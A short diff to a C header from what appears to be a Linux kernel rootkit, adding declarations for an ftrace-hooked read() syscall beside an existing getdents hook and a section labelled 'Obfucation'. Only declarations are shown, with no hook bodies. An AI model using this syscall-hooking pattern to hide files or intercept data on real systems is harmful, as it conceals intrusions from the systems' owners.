@@ -38,10 +38,12 @@ extern	struct workqueue_struct *g_delayed_init_wq;
 extern	struct delayed_work g_delayed_init_work;
 
 asmlinkage long myGetDents(const struct pt_regs *regs);
+asmlinkage long myRead(const struct pt_regs *regs);
 
 int fh_install_hook(t_ftrace_hook *hook);
 void fh_remove_hook(t_ftrace_hook *hook);
 extern asmlinkage long (*g_original_getdents)(const struct pt_regs *);
+extern asmlinkage long (*g_original_read)(const struct pt_regs *);
 
 /* Obfucation */
 void compile_companion(void);
